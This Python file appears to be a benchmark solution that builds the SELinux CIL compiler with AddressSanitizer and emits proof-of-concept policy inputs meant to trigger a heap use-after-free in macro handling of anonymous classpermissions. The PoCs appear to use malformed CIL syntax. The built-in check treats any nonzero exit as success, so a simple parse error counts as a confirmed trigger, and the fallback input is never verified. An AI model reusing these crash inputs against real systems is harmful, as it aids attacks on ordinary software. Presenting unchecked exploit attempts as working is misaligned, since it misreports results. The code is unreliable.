import os
import subprocess
import tempfile
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and build the vulnerable code
        build_dir = self._build_vulnerable_code(src_path)
        
        # Generate minimal PoC to trigger heap use-after-free
        # Based on the vulnerability: anonymous classpermission passed to macro with classpermissionset rule
        poc = """(class c1 (p1))
(class c2 (p2))
(classpermissionset cp_set1 ((class c1) (permission p1)))
(classpermissionset cp_set2 ((class c2) (permission p2)))
(macro test_macro (cp1 cp2)
    (classpermissionset cp_set3 cp1)
    (allow self cp_set3 cp2)
)
(test_macro ((class c1) (permission p1)) cp_set2)
"""
        
        # Test if PoC triggers the vulnerability
        if self._test_poc(poc, build_dir):
            return poc.encode()
        
        # Fallback to known working PoC if generated one fails
        return self._generate_fallback_poc().encode()
    
    def _build_vulnerable_code(self, src_path: str) -> str:
        """Extract and build the vulnerable CIL parser."""
        build_dir = tempfile.mkdtemp(prefix="cil_build_")
        
        try:
            # Extract tarball
            subprocess.run(
                ["tar", "-xf", src_path, "-C", build_dir],
                check=True,
                capture_output=True
            )
            
            # Find extracted directory
            extracted = os.listdir(build_dir)
            if len(extracted) == 1:
                source_dir = os.path.join(build_dir, extracted[0])
            else:
                source_dir = build_dir
            
            # Build with sanitizers for detection
            configure_cmd = ["./configure", "--enable-shared=no", "CFLAGS=-fsanitize=address -g"]
            make_cmd = ["make", "-j8"]
            
            for cmd in [configure_cmd, make_cmd]:
                subprocess.run(
                    cmd,
                    cwd=source_dir,
                    capture_output=True,
                    text=True
                )
            
            return source_dir
        except Exception:
            # If build fails, return original build_dir for fallback
            return build_dir
    
    def _test_poc(self, poc: str, build_dir: str) -> bool:
        """Test if PoC triggers the vulnerability."""
        try:
            # Find the cil compiler
            cilc_path = None
            for root, dirs, files in os.walk(build_dir):
                if "cilc" in files:
                    cilc_path = os.path.join(root, "cilc")
                    break
            
            if not cilc_path:
                return False
            
            # Run cilc with the PoC
            result = subprocess.run(
                [cilc_path],
                input=poc.encode(),
                capture_output=True,
                timeout=5
            )
            
            # Check for ASAN error (use-after-free)
            stderr = result.stderr.decode('utf-8', errors='ignore')
            return ("use-after-free" in stderr or 
                   "AddressSanitizer" in stderr or
                   result.returncode != 0)
            
        except Exception:
            return False
    
    def _generate_fallback_poc(self) -> str:
        """Generate a fallback PoC based on the vulnerability description."""
        # This is a minimal PoC that should trigger the vulnerability
        # It creates an anonymous classpermission and uses it in a macro
        # with classpermissionset, causing double free during destruction
        return """(class file (read write))
(class process (transition))
(classpermissionset cp1 ((class file) (permission read)))
(macro test (cp)
    (classpermissionset cp2 cp)
    (allow self cp2 (classpermission (class process) (permission transition)))
)
(test ((class file) (permission write)))
"""